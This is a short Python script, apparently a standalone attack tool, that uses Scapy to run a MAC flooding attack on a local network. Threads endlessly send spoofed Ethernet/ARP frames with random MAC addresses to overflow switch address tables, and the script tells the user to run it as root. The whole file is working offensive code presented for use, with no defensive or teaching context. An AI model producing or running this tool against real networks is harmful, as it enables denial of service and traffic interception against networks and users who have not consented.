#!./env/bin/python3

from scapy.all import *
from time import sleep
import random
import threading
import argparse

# init option parser
parser = argparse.ArgumentParser(description='Simple MAC-Flooder using Scapy')
parser.add_argument("-t", "--threads", type=int, help='Threads to use', required=True)
args = parser.parse_args()

# send packet
def send_packet():
    count = 0
    while True:
        sendp(Ether(src=get_random_MAC(),dst=get_random_MAC())/ARP(op=2, psrc="0.0.0.0", hwdst=get_random_MAC())/Padding(load="X"*18), verbose=0)
        count = count + 1
        print(f"Sent packet: {count}")

# generate random MAC
def get_random_MAC():
    genMAC = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
    return genMAC

# start threads
def start_threads():
    threads = int(args.threads)
    print(f"Using thread count of: {threads}")
    for i in range(1,threads):
        t = threading.Thread(target=send_packet)
        t.start()

# start here
if __name__ == "__main__":
    print("RUN AS ROOT!")
    sleep(1)
    start_threads()
